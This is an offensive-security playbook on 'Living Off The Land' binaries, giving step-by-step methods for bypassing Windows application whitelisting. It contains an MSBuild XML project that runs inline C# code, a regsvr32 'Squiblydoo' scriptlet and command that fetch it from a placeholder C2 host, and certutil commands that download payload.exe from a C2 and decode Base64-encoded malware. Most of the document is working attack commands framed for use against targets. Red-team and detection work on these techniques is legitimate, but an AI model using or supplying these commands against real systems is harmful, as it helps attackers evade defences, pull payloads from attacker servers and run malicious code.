# 🪓 Living Off The Land (LOLBins)

When a target environment enforces strict Application Whitelisting (like Windows AppLocker or WDAC), you cannot simply drop custom executables. The system will block it because it is not signed by a trusted publisher.

To bypass this, Advanced Persistent Threats (APTs) "Live off the Land." They use binaries that are already installed on Windows, digitally signed by Microsoft, and inherently trusted by the operating system, to execute malicious payloads. These are called **LOLBins (Living Off The Land Binaries)**.

## 🍯 The Zencefil LOLBins Playbook

Below are the most effective, battle-tested methods to bypass Application Whitelisting using Microsoft's own tools.

---

### 1. MSBuild.exe (The Developer's Backdoor)
MSBuild.exe is the Microsoft Build Engine. It is trusted to compile and execute C# code on the fly. You can embed your malicious C# payload (or shellcode runner) inside an XML project file.

**The Malicious XML (zencefil_build.xml):**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Zencefil">
    <ZencefilClass />
  </Target>
  <UsingTask
    TaskName="ZencefilClass"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        
        public class ZencefilClass : Task, ITask {
            public override bool Execute() {
                // YOUR MALICIOUS C# CODE HERE
                Process.Start("calc.exe"); 
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Execution:**
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe zencefil_build.xml
```

---

### 2. Regsvr32.exe (Squiblydoo Attack)
Regsvr32.exe is a command-line utility to register and unregister OLE controls. It can be abused to fetch and execute a COM scriptlet (.sct file) directly from the internet, completely bypassing AppLocker.

**The Malicious Scriptlet (zencefil.sct hosted on your C2):**
```xml
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="Zencefil"
    classid="{10001111-0000-0000-0000-000000000001}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo Zencefil was here > C:\\Windows\\Temp\\z.txt");
        ]]>
    </script>
</registration>
</scriptlet>
```

**Execution (Fileless):**
```cmd
regsvr32.exe /s /n /u /i:http://YOUR_C2_IP/zencefil.sct scrobj.dll
```

---

### 3. Certutil.exe (The Stealth Downloader)
Certutil.exe is used to manage certificates, but it is an excellent tool for downloading payloads and decoding Base64 strings natively on Windows, bypassing PowerShell logging.

**Download a file:**
```cmd
certutil.exe -urlcache -split -f http://YOUR_C2_IP/payload.exe C:\Windows\Temp\payload.exe
```

**Decode Base64 to an Executable:**
If you drop a text file with Base64 encoded malware (to bypass email filters), use certutil to reassemble it.
```cmd
certutil.exe -decode C:\Windows\Temp\encoded.txt C:\Windows\Temp\decoded.exe
```
